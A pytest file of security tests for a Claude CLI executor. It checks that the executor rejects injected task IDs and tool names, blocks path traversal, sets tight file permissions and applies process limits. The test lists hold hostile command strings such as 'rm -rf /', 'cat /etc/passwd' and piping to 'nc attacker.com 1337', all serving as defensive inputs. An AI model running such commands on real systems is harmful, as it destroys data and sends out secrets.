"""
Security tests for Claude CLI executor.

Tests for command injection vulnerabilities, input validation,
and process isolation security measures.
"""

import pytest
import tempfile
import shlex
from pathlib import Path
from unittest.mock import Mock, patch

from roles.claude_executor import ClaudeExecutor, ClaudeExecutionConfig
from roles.definitions import Role, ToolGroup, RestrictionType, RoleRestriction
from roles.execution import ExecutionContext


class TestCommandInjection:
    """Test command injection prevention."""

    @pytest.fixture
    def temp_project_root(self):
        """Create a temporary project root directory."""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.fixture
    def executor(self, temp_project_root):
        """Create a ClaudeExecutor instance for testing."""
        return ClaudeExecutor(temp_project_root)

    @pytest.fixture
    def mock_role(self):
        """Create a mock role with basic permissions."""
        return Role(
            name="test-role",
            display_name="Test Role",
            description="Test role for security testing",
            tool_groups=[ToolGroup.READ, ToolGroup.EDIT],
            restrictions=[]
        )

    @pytest.fixture
    def mock_context(self, mock_role):
        """Create a mock execution context."""
        context = Mock(spec=ExecutionContext)
        context.role = mock_role
        context.task_prompt = "Test task"
        context.project_context = None
        context.parent_context = None
        context.linked_documents = []
        context.tool_group_restrictions = []
        return context

    def test_task_id_validation_rejects_injection(self, executor):
        """Test that task IDs with injection attempts are rejected."""
        malicious_ids = [
            "task; rm -rf /",
            "task && cat /etc/passwd",
            "task | nc attacker.com 1337",
            "task`whoami`",
            "task$(id)",
            "../../../etc/passwd",
            "task\x00hidden",
            "task\nls -la",
        ]
        
        for malicious_id in malicious_ids:
            with pytest.raises(ValueError, match="Task ID contains invalid characters"):
                executor._validate_task_id(malicious_id)

    def test_task_id_validation_accepts_valid_ids(self, executor):
        """Test that valid task IDs are accepted."""
        valid_ids = [
            "task-123",
            "task_456", 
            "abc123",
            "my-valid-task-id",
            "task_with_underscores"
        ]
        
        for valid_id in valid_ids:
            result = executor._validate_task_id(valid_id)
            assert result == valid_id

    def test_task_id_length_limit(self, executor):
        """Test that overly long task IDs are rejected."""
        long_id = "a" * 65  # Exceeds MAX_TASK_ID_LENGTH
        with pytest.raises(ValueError, match="Task ID too long"):
            executor._validate_task_id(long_id)

    def test_tool_validation_rejects_malicious_tools(self, executor):
        """Test that malicious tool names are rejected."""
        malicious_tools = [
            "; rm -rf /",
            "bash && cat /etc/passwd", 
            "read | nc attacker.com",
            "`whoami`",
            "$(id)",
            "../../../bin/sh",
            "tool\x00hidden",
            "tool\nrm"
        ]
        
        result = executor._validate_tools(malicious_tools)
        assert result == []  # All should be rejected

    def test_tool_validation_filters_disallowed_tools(self, executor):
        """Test that tools not in whitelist are rejected."""
        disallowed_tools = [
            "dangerous-tool",
            "system-tool",
            "network-scanner",
            "file-destroyer"
        ]
        
        result = executor._validate_tools(disallowed_tools)
        assert result == []  # All should be rejected

    def test_tool_validation_accepts_allowed_tools(self, executor):
        """Test that whitelisted tools are accepted."""
        allowed_tools = ["read", "write", "edit", "bash", "grep"]
        result = executor._validate_tools(allowed_tools)
        assert set(result) == set(allowed_tools)

    def test_working_directory_path_traversal_prevention(self, executor, temp_project_root):
        """Test that path traversal attacks in working directory are prevented."""
        malicious_paths = [
            "../../../etc",
            "/tmp/malicious",
            str(temp_project_root.parent / "outside"),
            "../../..",
            "/root"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(ValueError, match="Working directory outside project root|does not exist"):
                executor._validate_working_directory(malicious_path)

    def test_working_directory_accepts_valid_subdirs(self, executor, temp_project_root):
        """Test that valid subdirectories are accepted."""
        # Create valid subdirectory
        subdir = temp_project_root / "subdir"
        subdir.mkdir()
        
        result = executor._validate_working_directory(str(subdir))
        assert result == subdir

    @patch('roles.claude_executor.asyncio.create_subprocess_exec')
    async def test_command_construction_uses_shlex_quote(self, mock_subprocess, executor, mock_context):
        """Test that command construction properly quotes arguments."""
        mock_process = Mock()
        mock_process.pid = 1234
        mock_subprocess.return_value = mock_process
        
        # Mock the prepare command method to check argument quoting
        with patch.object(executor, '_prepare_claude_command') as mock_prepare:
            mock_prepare.return_value = (
                ["claude", "--allowed-tools", "read", "write"], 
                Path("/tmp/prompt.md")
            )
            
            try:
                await executor.execute_task_with_claude(mock_context, "test-task", dry_run=True)
            except Exception:
                pass  # We're just testing command preparation
            
            # Verify prepare was called with validated task ID
            mock_prepare.assert_called_once()

    def test_prompt_file_creation_secure_permissions(self, executor):
        """Test that prompt files are created with secure permissions."""
        content = "Test prompt content"
        task_id = "test-task"
        
        prompt_file = executor._create_prompt_file(content, task_id)
        
        try:
            # Check file permissions (owner read/write only)
            file_mode = prompt_file.stat().st_mode
            assert file_mode & 0o777 == 0o600, f"File permissions should be 0o600, got {oct(file_mode & 0o777)}"
            
            # Check parent directory permissions
            parent_mode = prompt_file.parent.stat().st_mode
            assert parent_mode & 0o777 == 0o700, f"Directory permissions should be 0o700, got {oct(parent_mode & 0o777)}"
            
            # Verify content
            assert prompt_file.read_text() == content
            
        finally:
            # Cleanup
            if prompt_file.exists():
                prompt_file.unlink()


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_project_root_validation(self):
        """Test project root validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            valid_root = Path(temp_dir)
            executor = ClaudeExecutor(valid_root)
            assert executor.project_root == valid_root.resolve()

    def test_project_root_nonexistent_rejection(self):
        """Test that nonexistent project roots are rejected."""
        nonexistent = Path("/nonexistent/directory")
        with pytest.raises(ValueError, match="Project root does not exist"):
            ClaudeExecutor(nonexistent)

    def test_project_root_file_rejection(self):
        """Test that files instead of directories are rejected as project root."""
        with tempfile.NamedTemporaryFile() as temp_file:
            file_path = Path(temp_file.name)
            with pytest.raises(ValueError, match="Project root is not a directory"):
                ClaudeExecutor(file_path)


class TestProcessIsolation:
    """Test process isolation and resource limits."""

    @patch('roles.claude_executor.resource')
    def test_process_limits_setup(self, mock_resource):
        """Test that process limits are properly configured."""
        with tempfile.TemporaryDirectory() as temp_dir:
            executor = ClaudeExecutor(Path(temp_dir))
            
            # Call the setup method
            executor._setup_process_limits()
            
            # Verify resource limits were set
            expected_calls = [
                # Memory limit (1GB)
                ('RLIMIT_AS', (1024 * 1024 * 1024, 1024 * 1024 * 1024)),
                # CPU time limit (10 minutes)
                ('RLIMIT_CPU', (600, 600)),
                # File size limit (100MB)
                ('RLIMIT_FSIZE', (100 * 1024 * 1024, 100 * 1024 * 1024)),
                # Process count limit
                ('RLIMIT_NPROC', (10, 10))
            ]
            
            for resource_type, limits in expected_calls:
                mock_resource.setrlimit.assert_any_call(
                    getattr(mock_resource, resource_type), limits
                )

    def test_process_limits_graceful_failure(self):
        """Test that process limits setup fails gracefully on unsupported systems."""
        with tempfile.TemporaryDirectory() as temp_dir:
            executor = ClaudeExecutor(Path(temp_dir))
            
            # Should not raise an exception even if resource module unavailable
            with patch('roles.claude_executor.resource', side_effect=ImportError):
                executor._setup_process_limits()  # Should not raise


class TestSecurityRegression:
    """Regression tests for security vulnerabilities."""

    def test_no_shell_injection_in_allowed_tools(self):
        """Test that shell metacharacters in tools don't cause injection."""
        with tempfile.TemporaryDirectory() as temp_dir:
            executor = ClaudeExecutor(Path(temp_dir))
            
            # These should all be rejected
            dangerous_tools = [
                "read; cat /etc/passwd",
                "write && rm -rf /",
                "edit | nc attacker.com 1337",
                "bash `whoami`"
            ]
            
            validated = executor._validate_tools(dangerous_tools)
            assert validated == [], f"Dangerous tools should be rejected: {validated}"

    def test_shlex_quote_prevents_injection(self):
        """Test that shlex.quote properly escapes dangerous characters."""
        dangerous_strings = [
            "normal_string",
            "string with spaces",
            "string;with;semicolons",
            "string&&with&&ampersands",
            "string|with|pipes",
            "string`with`backticks",
            "string$with$dollars",
            "string(with)parens"
        ]
        
        for dangerous in dangerous_strings:
            quoted = shlex.quote(dangerous)
            
            # The quoted version should be safe to use in shell
            # This is a basic test - real validation would involve actual shell execution
            assert "'" in quoted or '"' in quoted or dangerous.isalnum()